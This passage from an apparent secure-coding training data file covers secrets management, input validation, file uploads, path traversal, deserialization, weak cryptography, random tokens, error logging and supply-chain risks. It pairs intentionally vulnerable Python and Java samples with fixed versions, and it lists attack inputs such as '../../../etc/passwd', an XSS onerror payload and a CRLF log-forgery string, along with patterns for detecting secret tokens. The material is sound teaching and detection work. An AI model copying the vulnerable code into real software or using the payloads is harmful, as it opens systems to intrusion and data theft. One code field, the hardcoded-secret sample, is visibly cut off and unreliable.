            "Check that password hashing configurations enforce a minimum work factor (bcrypt >= 12, PBKDF2 >= 600,000)."
        ]
    },
    {
        "id": 10,
        "title": "Secret and API-Key Management",
        "cwe": "CWE-798 (Use of Hard-coded Credentials)",
        "owasp": "A07:2021 - Identification and Authentication Failures",
        "concepts": [
            "Hardcoding credentials, API keys, private certificates, or database connection strings in source code exposes secrets.",
            "Source code repositories are replicated across developer workstations, backup servers, and CI/CD pipelines.",
            "Automated scraping bots index public GitHub and GitLab repositories within seconds, extracting leaked credentials.",
            "Secrets committed to version control remain in Git history even if deleted in a subsequent commit.",
            "Configuration must be decoupled from application code, following Twelve-Factor App methodology.",
            "Environment variables (.env files locally, system environment in production) provide secure credential injection.",
            "Dedicated secret managers (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault) provide centralized storage and rotation.",
            "Shannon entropy analysis can identify high-entropy random strings characteristic of API keys and cryptographic secrets.",
            "Static analysis rules use regular expressions to match known token patterns (AWS, GitHub, Slack, Stripe).",
            "Git pre-commit hooks (TruffleHog, Gitleaks) prevent secrets from ever being committed to local repositories."
        ],
        "threat_model": [
            "Threat Actors: Malicious actors crawling public repositories, disgruntled insiders, compromised third-party dependencies.",
            "Attacker Goals: Gaining unauthorized cloud infrastructure access, abusing third-party paid APIs, data extortion.",
            "Attack Vectors: Searching commit logs for strings like AWS_SECRET_KEY, api_key, password, token."
        ],
        "py_vuln": """# VULNERABLE: Hardcoded production secrets in source file
STRIPE_SECRET_KEY
        "py_sec": """# SECURE: Loading credentials from system environment variables
import os
from dotenv import load_dotenv

load_dotenv()  # Loads .env locally; .env is excluded via .gitignore

AWS_ACCESS_KEY_ID = os.environ.get("AWS_ACCESS_KEY_ID")
AWS_SECRET_ACCESS_KEY = os.environ.get("AWS_SECRET_ACCESS_KEY")
DATABASE_URL = os.environ.get("DATABASE_URL")

if not DATABASE_URL:
    raise RuntimeError("CRITICAL CONFIGURATION ERROR: DATABASE_URL must be configured.")""",
        "java_vuln": """// VULNERABLE: Hardcoded cryptographic key in Java class
public class CryptoConstants {
    public static final String AES_KEY = "MySuperSecretKey12345678"; // Hardcoded symmetric key
    public static final String DB_PASS = "ProductionAdminPassword!2026";
}""",
        "java_sec": """// SECURE: Injecting secrets via Spring Boot configuration properties
@Component
public class VaultSecretConfig {
    @Value("${database.password}")
    private String dbPassword;

    @Value("${aws.secret.key}")
    private String awsSecretKey;
}""",
        "heuristics": [
            "Scan for variables matching (password|secret|token|api_key|private_key) assigned to string literals.",
            "Check for standard token prefixes: AKIA (AWS), ghp_ (GitHub), sk_live_ (Stripe), AIza (Google).",
            "Verify that .env files are included in the repository's .gitignore file.",
            "Flag private key header blocks: -----BEGIN RSA PRIVATE KEY-----."
        ]
    },
    {
        "id": 11,
        "title": "Input Validation and Output Encoding",
        "cwe": "CWE-20 (Improper Input Validation) and CWE-116 (Improper Encoding or Escaping of Output)",
        "owasp": "A03:2021 - Injection",
        "concepts": [
            "Input validation and output encoding are the two fundamental complementary defenses against injection vulnerabilities.",
            "Input validation operates under a Positive Security Model (Whitelisting): accept known-good formats, reject everything else.",
            "Negative Security Models (Blacklisting) search for forbidden characters (', <, >) and are consistently bypassed.",
            "Input validation must enforce data types, acceptable string lengths, allowable character sets, and numeric ranges.",
            "Validation should occur as early as possible in request processing, before data reaches business logic or storage layers.",
            "Output encoding neutralizes untrusted data specifically for the downstream interpreter context.",
            "Contexts requiring distinct encoding schemes include HTML body, HTML attributes, JavaScript contexts, CSS, and URLs.",
            "Data transferred between internal microservices must still be validated; never assume internal traffic is trustworthy.",
            "Schema validation libraries (Pydantic for Python, Hibernate Validator for Java) provide declarative type enforcement.",
            "Client-side validation provides user experience feedback only and must always be duplicated by server-side validation."
        ],
        "threat_model": [
            "Threat Actors: Untrusted users submitting malformed, oversized, or specially crafted data payloads.",
            "Attacker Goals: Triggering unexpected application states, executing injection attacks, causing denial of service.",
            "Attack Vectors: Submitting multi-gigabyte payloads, bypassing client-side regex checks using curl or Postman."
        ],
        "py_vuln": """# VULNERABLE: Naive blacklist filtering susceptible to bypass
def sanitize_user_input(text: str) -> str:
    # Trivial bypass: <SCRIPT> or <img src=x onerror=alert(1)>
    bad_tags = ["<script>", "</script>"]
    for tag in bad_tags:
        text = text.replace(tag, "")
    return text""",
        "py_sec": """# SECURE: Declarative whitelist schema validation using Pydantic
from pydantic import BaseModel, Field, EmailStr
import re

class UserProfileDTO(BaseModel):
    username: str = Field(..., min_length=3, max_length=24, pattern=r"^[a-zA-Z0-9_]+$")
    email: EmailStr
    age: int = Field(..., ge=18, le=120)
    bio: str = Field(default="", max_length=250)

def validate_profile_payload(raw_json: dict) -> UserProfileDTO:
    # Validates types, string patterns, boundaries, and structure automatically
    return UserProfileDTO(**raw_json)""",
        "java_vuln": """// VULNERABLE: Unbounded input acceptance without schema validation
@PostMapping("/register")
public ResponseEntity<String> registerUser(@RequestBody Map<String, Object> payload) {
    String username = (String) payload.get("username"); // Unchecked type cast and no length check
    saveToDatabase(username);
    return ResponseEntity.ok("Registered");
}""",
        "java_sec": """// SECURE: Strong validation using Jakarta Bean Validation annotations
import jakarta.validation.constraints.*;

public class UserRegistrationRequest {
    @NotNull
    @Pattern(regexp = "^[a-zA-Z0-9_]{3,24}$", message = "Username must be 3-24 alphanumeric characters")
    private String username;

    @NotNull
    @Email(message = "Email address must be well-formed")
    private String email;

    @Min(18) @Max(120)
    private int age;
}""",
        "heuristics": [
            "Identify functions relying on str.replace() or regex substitution to sanitize malicious markup.",
            "Flag endpoints accepting raw unvalidated dictionaries or JSON blobs without schema models.",
            "Verify that numeric inputs are parsed into integers or floats before database or system operations.",
            "Check for unbounded string fields in database models and REST request handlers."
        ]
    },
    {
        "id": 12,
        "title": "File Upload Security",
        "cwe": "CWE-434 (Unrestricted Upload of File with Dangerous Type)",
        "owasp": "A04:2021 - Insecure Design",
        "concepts": [
            "Allowing users to upload files to a web server introduces severe security risks if not strictly constrained.",
            "Uploading executable files (.php, .jsp, .py, .sh) into web-accessible directories allows direct Remote Code Execution.",
            "Attackers can leverage malicious filenames (../../etc/cron.d/job) to achieve arbitrary path traversal and file overwrite.",
            "Uploading oversized files or decompression bombs (Zip Bombs) exhausts disk space and memory, causing Denial of Service.",
            "Uploading SVG or HTML files containing embedded JavaScript results in Stored Cross-Site Scripting upon retrieval.",
            "Relying solely on the Content-Type header or client-provided file extension is insecure, as both are easily forged.",
            "File types must be verified by inspecting file magic bytes (signatures) using libraries like python-magic or filetype.",
            "Uploaded files must be saved outside the web server's public document root with non-executable filesystem permissions.",
            "Applications should rename uploaded files to randomly generated UUIDs, discarding original client-provided filenames.",
            "Files served back to users should include Content-Disposition: attachment and X-Content-Type-Options: nosniff headers."
        ],
        "threat_model": [
            "Threat Actors: External users uploading profile avatars, document attachments, or spreadsheet imports.",
            "Attacker Goals: Uploading a web shell to execute server commands, defacing web pages, crashing server storage.",
            "Attack Vectors: Uploading shell.php.jpg with Content-Type: image/jpeg, uploading 42.zip decompression bomb."
        ],
        "py_vuln": """# VULNERABLE: Direct upload saving using user-controlled filename
from flask import Flask, request
import os

app = Flask(__name__)

@app.route("/upload", methods=["POST"])
def upload_file():
    uploaded_file = request.files["avatar"]
    # Path traversal and RCE: Attacker passes '../../var/www/html/shell.php'
    destination = os.path.join("/var/www/uploads", uploaded_file.filename)
    uploaded_file.save(destination)
    return "File uploaded successfully" """,
        "py_sec": """# SECURE: Strict whitelisting, UUID renaming, and size verification
import os
import uuid
from flask import Flask, request, abort
from werkzeug.utils import secure_filename

app = Flask(__name__)
UPLOAD_DIRECTORY = os.path.abspath("safe_user_uploads")
ALLOWED_EXTENSIONS = {".png", ".jpg", ".jpeg", ".pdf"}
MAX_CONTENT_LENGTH = 5 * 1024 * 1024  # 5 MB limit

def secure_handle_upload(file_storage):
    # 1. Verify file presence and extension whitelist
    original_filename = secure_filename(file_storage.filename or "")
    ext = os.path.splitext(original_filename)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        abort(400, "Disallowed file extension")

    # 2. Generate cryptographically random, collision-free filename
    safe_filename = f"{uuid.uuid4().hex}{ext}"
    target_path = os.path.join(UPLOAD_DIRECTORY, safe_filename)

    # 3. Ensure destination remains strictly within the upload directory
    if not target_path.startswith(UPLOAD_DIRECTORY):
        abort(400, "Path traversal attempt detected")

    file_storage.save(target_path)
    return safe_filename""",
        "java_vuln": """// VULNERABLE: Writing uploaded file directly using client-supplied filename
@PostMapping("/upload")
public String handleUpload(@RequestParam("file") MultipartFile file) throws IOException {
    File dest = new File("/var/www/uploads/" + file.getOriginalFilename());
    file.transferTo(dest); // Vulnerable to path traversal and web shell execution
    return "Uploaded";
}""",
        "java_sec": """// SECURE: Enforcing extension whitelist and randomized storage name
@PostMapping("/upload")
public ResponseEntity<String> handleUploadSecure(@RequestParam("file") MultipartFile file) throws IOException {
    if (file.getSize() > 5 * 1024 * 1024) {
        return ResponseEntity.badRequest().body("File exceeds 5MB limit");
    }
    String cleanName = FilenameUtils.getName(file.getOriginalFilename());
    String ext = FilenameUtils.getExtension(cleanName).toLowerCase();
    if (!List.of("png", "jpg", "jpeg", "pdf").contains(ext)) {
        return ResponseEntity.badRequest().body("Invalid file type");
    }
    String generatedId = UUID.randomUUID().toString() + "." + ext;
    Path destination = Paths.get("/var/safe_storage", generatedId).normalize();
    Files.copy(file.getInputStream(), destination, StandardCopyOption.REPLACE_EXISTING);
    return ResponseEntity.ok(generatedId);
}""",
        "heuristics": [
            "Check for file.save() or transferTo() called directly with file.filename.",
            "Verify that upload file size constraints (MAX_CONTENT_LENGTH) are enforced in application configuration.",
            "Identify missing file extension validation before file storage operations.",
            "Flag instances where files are stored inside public static asset directories."
        ]
    },
    {
        "id": 13,
        "title": "Path Traversal",
        "cwe": "CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)",
        "owasp": "A01:2021 - Broken Access Control",
        "concepts": [
            "Path traversal (directory traversal or dot-dot-slash ../) occurs when user input determines filesystem paths.",
            "Attackers inject ../ or ..\\ sequences to escape designated storage directories and access restricted files.",
            "Common targets include /etc/passwd, /etc/shadow, Windows win.ini, configuration files, and application source code.",
            "Attackers utilize URL-encoding (%2e%2e%2f) or double-encoding (%252e%252e%252f) to bypass naive string filters.",
            "Null byte injections (%00 or \\0) were historically used in older runtimes to truncate file extension checks.",
            "Path canonicalization converts relative paths into absolute, normalized paths, resolving all symbolic links and .. segments.",
            "To prevent path traversal, applications must resolve the canonical path and verify it starts with the intended base directory.",
            "In Python, pathlib.Path.resolve() and Path.is_relative_to() provide modern, secure path boundary validation.",
            "In Java, java.nio.file.Path.normalize() and Path.startsWith() verify safe path containment.",
            "Hardcoding fixed identifiers in database lookups rather than accepting direct filenames eliminates path traversal entirely."
        ],
        "threat_model": [
            "Threat Actors: Remote users attempting to view system files, database configurations, or source code.",
            "Attacker Goals: Exfiltrating sensitive system credentials, reading proprietary business logic, writing files to startup scripts.",
            "Attack Vectors: Supplying filename=../../../../etc/passwd in download or report view endpoints."
        ],
        "py_vuln": """# VULNERABLE: Direct path joining without canonicalization check
from flask import Flask, request, send_file
import os

app = Flask(__name__)
STORAGE_DIR = "/var/app/reports"

@app.route("/view_report")
def view_report():
    doc_name = request.args.get("doc")
    # Attacker passes: ../../../etc/passwd
    file_path = os.path.join(STORAGE_DIR, doc_name)
    return send_file(file_path)""",
        "py_sec": """# SECURE: Resolving canonical path and enforcing directory containment
from pathlib import Path
from flask import Flask, request, abort, send_file

app = Flask(__name__)
SAFE_STORAGE_ROOT = Path("/var/app/reports").resolve()

@app.route("/view_report_secure")
def view_report_secure():
    doc_name = request.args.get("doc", "")
    if not doc_name or "\0" in doc_name:
        abort(400, "Invalid document name")

    # Canonicalize target file path
    target_path = (SAFE_STORAGE_ROOT / doc_name).resolve()

    # Enforce that the canonical path resides strictly inside SAFE_STORAGE_ROOT
    if not target_path.is_relative_to(SAFE_STORAGE_ROOT):
        abort(403, "Access denied: Path traversal detected")
    if not target_path.is_file():
        abort(404, "Report not found")

    return send_file(str(target_path))""",
        "java_vuln": """// VULNERABLE: Path concatenation in Java without normalization
public class ReportServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        String reportName = req.getParameter("name");
        File file = new File("/var/app/reports", reportName);
        Files.copy(file.toPath(), resp.getOutputStream()); // Vulnerable to path traversal
    }
}""",
        "java_sec": """// SECURE: Boundary check using normalized Path in Java
public class SecureReportServlet extends HttpServlet {
    private static final Path BASE_PATH = Paths.get("/var/app/reports").toAbsolutePath().normalize();

    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        String reportName = req.getParameter("name");
        Path requestedPath = BASE_PATH.resolve(reportName).toAbsolutePath().normalize();

        if (!requestedPath.startsWith(BASE_PATH) || !Files.isRegularFile(requestedPath)) {
            resp.sendError(HttpServletResponse.SC_FORBIDDEN, "Access Denied");
            return;
        }
        Files.copy(requestedPath, resp.getOutputStream());
    }
}""",
        "heuristics": [
            "Flag os.path.join() or Path() invocations receiving unsanitized request parameter values.",
            "Verify that Path.resolve() or os.path.realpath() is called and verified with startswith() or is_relative_to().",
            "Identify file reading operations (open(), send_file(), FileInputStream) lacking directory boundary checks.",
            "Check for naive string replacements like filename.replace('../', '') which are bypassed by '....//'."
        ]
    },
    {
        "id": 14,
        "title": "Unsafe Deserialization",
        "cwe": "CWE-502 (Deserialization of Untrusted Data)",
        "owasp": "A08:2021 - Software and Data Integrity Failures",
        "concepts": [
            "Serialization converts memory object structures into byte streams or text formats for storage or transmission.",
            "Deserialization reconstructs in-memory object graphs from serialized streams.",
            "Unsafe deserialization allows attackers to instantiate arbitrary classes and trigger execution gadget chains.",
            "In Python, the pickle module contains an interpreted stack language; the __reduce__ method executes arbitrary callables.",
            "In Java, ObjectInputStream.readObject() instantiates classes on the classpath, leading to remote code execution (RCE).",
            "PyYAML's default yaml.load() instantiates arbitrary Python classes unless yaml.SafeLoader is explicitly configured.",
            "Vulnerable gadget chains leverage commonly used libraries (Apache Commons Collections, Spring, Groovy) present in applications.",
            "Modern applications should migrate from native binary serialization to structured, safe data formats like JSON or Protocol Buffers.",
            "If binary serialization is unavoidable, payloads must be cryptographically signed using HMAC-SHA256 and verified prior to loading.",
            "Java serialization filtering (JEP 290) allows defining strict object input filters to reject unauthorized classes."
        ],
        "threat_model": [
            "Threat Actors: Remote adversaries sending serialized objects via session cookies, message brokers, or API endpoints.",
            "Attacker Goals: Unauthenticated Remote Code Execution (RCE), complete system takeover, installing backdoors.",
            "Attack Vectors: Crafting serialized payloads with ysoserial (Java) or custom __reduce__ methods (Python pickle)."
        ],
        "py_vuln": """# VULNERABLE: Unpickling untrusted data from HTTP request
import pickle
import base64
from flask import request

@app.route("/restore_session", methods=["POST"])
def restore_session():
    cookie_data = request.cookies.get("session_state")
    raw_bytes = base64.b64decode(cookie_data)
    # Attacker crafts byte stream invoking os.system('id') via __reduce__
    user_session = pickle.loads(raw_bytes)
    return {"status": "success"}""",
        "py_sec": """# SECURE: Using standard JSON parsing and schema validation
import json
from flask import request, abort
from pydantic import BaseModel

class SessionStateModel(BaseModel):
    user_id: int
    username: str
    roles: list[str]

@app.route("/restore_session_secure", methods=["POST"])
def restore_session_secure():
    try:
        data = json.loads(request.get_data(as_text=True))
        session = SessionStateModel(**data)
        return {"status": "success", "user": session.username}
    except Exception:
        abort(400, "Invalid JSON payload format")""",
        "java_vuln": """// VULNERABLE: Deserializing untrusted byte streams using ObjectInputStream
import java.io.*;

public class StateManager {
    public Object deserializeObject(byte[] incomingData) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(incomingData));
        return ois.readObject(); // Gadget chains execute arbitrary code during readObject()
    }
}""",
        "java_sec": """// SECURE: Migrating to Jackson ObjectMapper with strong type constraints
import com.fasterxml.jackson.databind.ObjectMapper;

public class SecureStateManager {
    private final ObjectMapper mapper = new ObjectMapper();

    public UserSessionDTO deserializeUserSession(String jsonString) throws Exception {
        // Pure data deserialization without executing class bytecodes
        return mapper.readValue(jsonString, UserSessionDTO.class);
    }
}""",
        "heuristics": [
            "Flag any usage of pickle.loads(), pickle.load(), _pickle, or shelve in web application contexts.",
            "Identify yaml.load() invocations that lack Loader=yaml.SafeLoader or recommend yaml.safe_load().",
            "Check for java.io.ObjectInputStream usage lacking an ObjectInputFilter implementation.",
            "Warn when serialized objects are passed across network boundaries without cryptographic signatures."
        ]
    },
    {
        "id": 15,
        "title": "Cryptography and Weak Algorithms",
        "cwe": "CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)",
        "owasp": "A02:2021 - Cryptographic Failures",
        "concepts": [
            "Cryptography ensures the confidentiality, integrity, and authenticity of sensitive data at rest and in transit.",
            "Legacy hash algorithms (MD5, SHA-1) suffer from practical collision attacks and must never be used for security purposes.",
            "Legacy symmetric ciphers (DES, 3DES, RC4) have small block sizes or weak keys vulnerable to Sweet32 and bias attacks.",
            "Electronic Codebook (ECB) mode encrypts identical plaintext blocks into identical ciphertext blocks, leaking structural patterns.",
            "Modern symmetric cryptography mandates Authenticated Encryption with Associated Data (AEAD), such as AES-GCM or ChaCha20-Poly1305.",
            "AEAD provides confidentiality, integrity, and authenticity simultaneously by generating an authentication tag.",
            "Reusing an Initialization Vector (IV) or nonce in counter-based modes (GCM, CTR) destroys cryptographic security.",
            "Asymmetric encryption requires minimum key sizes: RSA >= 2048 bits (3072 recommended), ECC >= 256 bits.",
            "Cryptographic keys must never be hardcoded; they must be generated using CSPRNGs and managed via key vaults.",
            "Transport Layer Security (TLS 1.3) must be enforced for all network communications, deprecating TLS 1.0 and TLS 1.1."
        ],
        "threat_model": [
            "Threat Actors: Network eavesdroppers (Man-in-the-Middle), adversaries possessing intercepted encrypted data blobs.",
            "Attacker Goals: Decrypting confidential transactions, forging digital signatures, tampering with message contents undetected.",
            "Attack Vectors: Exploiting hash collisions to forge certificates, exploiting ECB pattern leakage in encrypted database fields."
        ],
        "py_vuln": """# VULNERABLE: Using MD5 for security token and AES in ECB mode
import hashlib
from Crypto.Cipher import AES

def create_auth_token(user_id: str) -> str:
    # Insecure: MD5 is broken and collision-prone
    return hashlib.md5(user_id.encode()).hexdigest()

def encrypt_record_insecure(key: bytes, plaintext: bytes) -> bytes:
    # Insecure: ECB mode preserves data patterns and lacks integrity protection
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(plaintext)""",
        "py_sec": """# SECURE: Using AES-256-GCM authenticated encryption with unique nonces
import secrets
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def encrypt_record_secure(key: bytes, plaintext: bytes) -> tuple[bytes, bytes]:
    # AES-GCM provides confidentiality and cryptographic integrity verification
    aesgcm = AESGCM(key)
    # Generate fresh, unique 12-byte (96-bit) nonce for EVERY encryption operation
    nonce = secrets.token_bytes(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data=None)
    return nonce, ciphertext

def decrypt_record_secure(key: bytes, nonce: bytes, ciphertext: bytes) -> bytes:
    aesgcm = AESGCM(key)
    # Raises InvalidTag exception if ciphertext or nonce was tampered with
    return aesgcm.decrypt(nonce, ciphertext, associated_data=None)""",
        "java_vuln": """// VULNERABLE: Using DES and MD5 in Java
import javax.crypto.Cipher;
import java.security.MessageDigest;

public class LegacyCryptoService {
    public byte[] encryptData(byte[] key, byte[] data) throws Exception {
        Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding"); // Weak 56-bit key and ECB mode
        return cipher.doFinal(data);
    }
}""",
        "java_sec": """// SECURE: AES-GCM implementation in Java with GCMParameterSpec
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.SecureRandom;

public class ModernCryptoService {
    private static final int GCM_TAG_LENGTH = 128; // bits
    private static final int IV_LENGTH = 12; // bytes

    public byte[] encrypt(SecretKeySpec key, byte[] plaintext) throws Exception {
        byte[] iv = new byte[IV_LENGTH];
        new SecureRandom().nextBytes(iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(GCM_TAG_LENGTH, iv));
        byte[] ciphertext = cipher.doFinal(plaintext);

        // Prepend IV to ciphertext for storage/transmission
        byte[] combined = new byte[IV_LENGTH + ciphertext.length];
        System.arraycopy(iv, 0, combined, 0, IV_LENGTH);
        System.arraycopy(ciphertext, 0, combined, IV_LENGTH, ciphertext.length);
        return combined;
    }
}""",
        "heuristics": [
            "Flag usages of hashlib.md5() or hashlib.sha1() when used in security-sensitive operations.",
            "Identify cipher instantiation strings containing ECB (e.g., AES.MODE_ECB, AES/ECB/PKCS5Padding).",
            "Flag usage of DES, 3DES (TripleDES), RC4, or Blowfish ciphers.",
            "Verify that RSA key generation specifies bit lengths of at least 2048 bits."
        ]
    },
    {
        "id": 16,
        "title": "Secure Random Number Generation",
        "cwe": "CWE-330 (Use of Insufficiently Random Values) and CWE-338 (Use of Cryptographically Weak PRNG)",
        "owasp": "A02:2021 - Cryptographic Failures",
        "concepts": [
            "Random numbers are fundamental to application security: session IDs, password reset tokens, OTPs, and cryptographic salts.",
            "Standard pseudo-random number generators (PRNGs) like Python's random and Java's java.util.Random are NOT cryptographically secure.",
            "Standard PRNGs (e.g., Mersenne Twister MT19937) are designed for statistical uniformity in simulations, games, and math models.",
            "After observing 624 consecutive 32-bit outputs of a Mersenne Twister generator, an attacker can reconstruct internal state.",
            "Reconstructing internal PRNG state allows adversaries to predict all past and future generated tokens.",
            "Cryptographically Secure Pseudo-Random Number Generators (CSPRNG) gather entropy from the operating system kernel.",
            "In Python, the secrets module (backed by os.urandom) must be used for all security-sensitive random generation.",
            "In Java, java.security.SecureRandom must be used instead of java.util.Random.",
            "Seeding PRNGs with predictable values (e.g., System.currentTimeMillis() or time.time()) introduces severe predictability.",
            "CSPRNG functions are non-deterministic and protect against state reconstruction even when observed continuously."
        ],
        "threat_model": [
            "Threat Actors: Remote attackers observing public password reset links, session tokens, or lottery numbers.",
            "Attacker Goals: Account takeover by predicting password reset tokens, hijacking active user sessions.",
            "Attack Vectors: Requesting consecutive tokens to deduce PRNG seed/state and calculating the reset token issued to an administrator."
        ],
        "py_vuln": """# VULNERABLE: Using standard random module for security tokens
import random
import string

def generate_password_reset_token():
    # Mersenne Twister internal state can be fully cloned after observing outputs
    chars = string.ascii_letters + string.digits
    return "".join(random.choice(chars) for _ in range(32))

def generate_one_time_pin():
    # Predictable OTP generation
    return str(random.randint(100000, 999999))""",
        "py_sec": """# SECURE: Using the secrets module for cryptographically secure tokens
import secrets

def generate_password_reset_token_secure() -> str:
    # Uses CSPRNG /dev/urandom or CryptGenRandom; unpredictable
    return secrets.token_urlsafe(32)

def generate_one_time_pin_secure() -> str:
    # Cryptographically secure 6-digit PIN
    return f"{secrets.randbelow(1_000_000):06d}" """,
        "java_vuln": """// VULNERABLE: Using java.util.Random for security-critical values
import java.util.Random;

public class TokenGenerator {
    private Random random = new Random(); // Linear Congruential Generator; predictable

    public String generateSessionToken() {
        return Long.toHexString(random.nextLong());
    }
}""",
        "java_sec": """// SECURE: Using java.security.SecureRandom in Java
import java.security.SecureRandom;
import java.util.Base64;

public class SecureTokenGenerator {
    private final SecureRandom secureRandom = new SecureRandom();

    public String generateSessionToken() {
        byte[] tokenBytes = new byte[32];
        secureRandom.nextBytes(tokenBytes);
        return Base64.getUrlEncoder().withoutPadding().encodeToString(tokenBytes);
    }
}""",
        "heuristics": [
            "Flag import random in files dealing with authentication, passwords, tokens, cryptography, or sessions.",
            "Identify instantiations of new java.util.Random() and recommend java.security.SecureRandom.",
            "Check for random.seed() invocations utilizing timestamp values (time.time()).",
            "Verify that OTP and session token generators call secrets.choice() or secrets.token_urlsafe()."
        ]
    },
    {
        "id": 17,
        "title": "Error Handling and Logging",
        "cwe": "CWE-209 (Generation of Error Message Containing Sensitive Information) and CWE-117 (Improper Output Handling for Logs)",
        "owasp": "A09:2021 - Security Logging and Monitoring Failures",
        "concepts": [
            "Unhandled exceptions and verbose error messages leak internal architectural details (stack traces, SQL snippets, file paths).",
            "Attackers leverage verbose error messages to perform reconnaissance and tailor targeted exploits.",
            "Production error pages must return generic, user-friendly status messages accompanied by opaque incident correlation IDs.",
            "Detailed technical diagnostic traces must be recorded internally in secure server-side log files.",
            "Log Injection (CRLF Injection) happens when untrusted user input containing \\r or \\n characters is written to logs.",
            "CRLF injection allows attackers to forge fake log entries, blinding security analysts and corrupting SIEM parsing rules.",
            "Sensitive data (passwords, credit cards, SSNs, API tokens, session cookies) must NEVER be written to application logs.",
            "Log rotation and retention policies must ensure logs are preserved for forensic analysis while complying with privacy laws.",
            "Audit logs must record who performed the action, what was modified, when it occurred, and the outcome (success/failure).",
            "Centralized SIEM ingestion pipelines should monitor for suspicious anomaly patterns (e.g., 50 failed logins in 1 minute)."
        ],
        "threat_model": [
            "Threat Actors: Attackers probing web endpoints with malformed requests to trigger stack traces; malicious actors forging logs.",
            "Attacker Goals: Gaining internal reconnaissance, misleading forensic investigators, exfiltrating credentials from log files.",
            "Attack Vectors: Injecting CRLF sequences into User-Agent headers, analyzing SQL syntax errors to determine database engine."
        ],
        "py_vuln": """# VULNERABLE: Exposing full stack trace in HTTP response and logging unvalidated input
from flask import Flask, request
import logging

app = Flask(__name__)

@app.route("/execute_payment", methods=["POST"])
def payment():
    try:
        user_account = request.json["account"]
        # CRLF Injection: user_account contains "acc123\\n[INFO] Payment Approved $1,000,000"
        logging.info("Processing account: %s", user_account)
        return perform_payment(user_account)
    except Exception as e:
        import traceback
        # Leaking internal stack trace to client
        return {"error": str(e), "traceback": traceback.format_exc()}, 500""",
        "py_sec": """# SECURE: Sanitizing log entries, logging internally, returning generic incident ID
from flask import Flask, request, jsonify
import logging
import uuid
import re

app = Flask(__name__)
logger = logging.getLogger("secure_payments")

def sanitize_for_log(data: str) -> str:
    # Replace newline and carriage return characters to prevent log forgery
    return re.sub(r"[\r\n]", " ", str(data))

@app.route("/execute_payment_secure", methods=["POST"])
def payment_secure():
    try:
        user_account = request.json.get("account", "")
        logger.info("Processing payment for account: %s", sanitize_for_log(user_account))
        return perform_payment(user_account)
    except Exception as e:
        incident_id = uuid.uuid4().hex[:8]
        # Log full diagnostics internally with incident ID
        logger.error("Incident [%s] Payment failed: %s", incident_id, sanitize_for_log(str(e)), exc_info=True)
        # Return opaque response to client
        return jsonify({
            "error": "Payment processing failed. Please contact support with the incident ID.",
            "incident_id": incident_id
        }), 500""",
        "java_vuln": """// VULNERABLE: Printing stack trace directly to servlet response
public class PaymentServlet extends HttpServlet {
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        try {
            processPayment(req);
        } catch (Exception e) {
            e.printStackTrace(resp.getWriter()); // Exposes stack trace to client!
        }
    }
}""",
        "java_sec": """// SECURE: Generic error message and structured server logging
public class SecurePaymentServlet extends HttpServlet {
    private static final Logger logger = LoggerFactory.getLogger(SecurePaymentServlet.class);

    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        try {
            processPayment(req);
        } catch (Exception e) {
            String incidentId = UUID.randomUUID().toString().substring(0, 8);
            logger.error("Incident [{}] Payment failure: {}", incidentId, e.getMessage(), e);
            resp.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
            resp.setContentType("application/json");
            resp.getWriter().write("{\"error\":\"An internal error occurred.\",\"incident_id\":\"" + incidentId + "\"}");
        }
    }
}""",
        "heuristics": [
            "Flag HTTP responses returning traceback.format_exc(), e.printStackTrace(), or str(e).",
            "Identify logging statements passing sensitive variable names (password, token, credit_card, secret).",
            "Check for bare except: blocks that swallow exceptions silently without logging.",
            "Verify that log outputs containing user input strip or replace \\r and \\n characters."
        ]
    },
    {
        "id": 18,
        "title": "Dependency and Supply-Chain Security",
        "cwe": "CWE-1395 (Dependency on Vulnerable Third-Party Component)",
        "owasp": "A06:2021 - Vulnerable and Outdated Components",
        "concepts": [
            "Modern software applications consist predominantly of open-source dependencies and third-party libraries.",
            "A security defect in a deep transitive dependency impacts all upstream applications importing that library.",
            "Typosquatting attacks register malicious packages with names visually similar to popular packages (e.g., reqeusts vs. requests).",
            "Dependency confusion attacks exploit package managers configured to pull from both public and private repositories.",
            "Account takeover attacks compromise maintainer credentials to publish trojanized updates to trusted packages.",
            "Production applications must pin exact dependency versions and commit lockfiles (requirements.txt, Pipfile.lock, pom.xml).",
            "Lockfiles should record cryptographic SHA-256 hashes for each downloaded package archive to guarantee tamper-resistance.",
            "Software Bill of Materials (SBOM) manifests (CycloneDX, SPDX) catalog all direct and transitive dependencies.",
            "Automated vulnerability scanners (pip-audit, OWASP Dependency-Check, Snyk) must run in CI/CD pipelines.",
            "Organizations should establish an open-source vetting policy before introducing new third-party packages."
        ],
        "threat_model": [
            "Threat Actors: Cybercriminals poisoning open-source registries, nation-state actors executing supply-chain compromises.",
            "Attacker Goals: Injecting backdoors, exfiltrating environment variables containing cloud secrets, cryptomining.",
            "Attack Vectors: Pushing malicious update releases to PyPI, registering typosquatted package names, hijacking maintainer tokens."
        ],
        "py_vuln": """# VULNERABLE: Floating, unpinned dependencies in requirements.txt
flask>=2.0.0
requests
pyyaml
urllib3""",
        "py_sec": """# SECURE: Exact version pinning with hash verification in requirements.txt
flask==3.1.3 --hash=sha256:6bb7b7529fd6...
requests==2.32.5 --hash=sha256:5688e146740d...
pyyaml==6.0.3 --hash=sha256:c220f781d990...
urllib3==2.6.3 --hash=sha256:8894178a5b28...""",
        "java_vuln": """<!-- VULNERABLE: Maven pom.xml using dynamic LATEST version range -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
